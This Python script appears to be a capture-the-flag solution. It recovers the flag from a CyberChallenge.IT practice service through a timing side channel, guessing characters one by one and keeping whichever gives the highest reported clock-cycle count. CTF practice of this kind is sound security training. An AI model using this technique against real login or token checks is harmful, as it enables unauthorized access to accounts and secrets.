import socket
import string
import re
from statistics import mean

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('benchmark.challs.cyberchallenge.it', 9031))


def connect_to_service():
    # Skip banner
    s.recv(4096).decode()
    return s


def try_password(s, password):
    # Send password
    s.sendall(f"{password}\n".encode())
    # Get response
    response = s.recv(4096).decode()

    # Extract clock cycles using regex
    match = re.search(r'checked in (\d+) clock cycles', response)
    if match:
        cycles = int(match.group(1))
        return cycles, "Correct" in response
    elif "Correct" in response:
        return -1, True
    else:
        return 0, False


def measure_with_multiple_attempts(password, attempts=3):
    results = []
    for _ in range(attempts):
        cycles, is_correct = try_password(s, password)
        if is_correct:
            return cycles, True
        if cycles > 0:
            results.append(cycles)
    return mean(results) if results else 0, False


def main():
    # Characters to try
    charset = string.printable.strip()  # All printable characters

    # Known prefix based on your tests
    known_password = "CCIT{"

    print(f"Starting with known prefix: {known_password}")

    while True:
        max_cycles = 0
        next_char = None

        # Try each possible next character
        for char in charset:
            test_password = known_password + char
            cycles, is_correct = measure_with_multiple_attempts(test_password)

            print(f"Tried: {test_password}, Cycles: {cycles}")

            if is_correct:
                known_password = test_password
                print(f"Found correct password: {known_password}")
                return

            if cycles > max_cycles:
                max_cycles = cycles
                next_char = char

        if next_char:
            known_password += next_char
            print(f"Found next character: {
                  next_char}, new password: {known_password}")

            # Check if we found a complete flag (usually ends with "}")
            if "}" in known_password and known_password.rindex("}") > known_password.index("{"):
                print(f"Potential complete flag found: {known_password}")
                # Verify the full password
                _, is_correct = measure_with_multiple_attempts(known_password)
                if is_correct:
                    print(f"Confirmed correct password: {known_password}")
                    return
        else:
            print("Failed to find next character. Stopping.")
            break


if __name__ == "__main__":
    main()
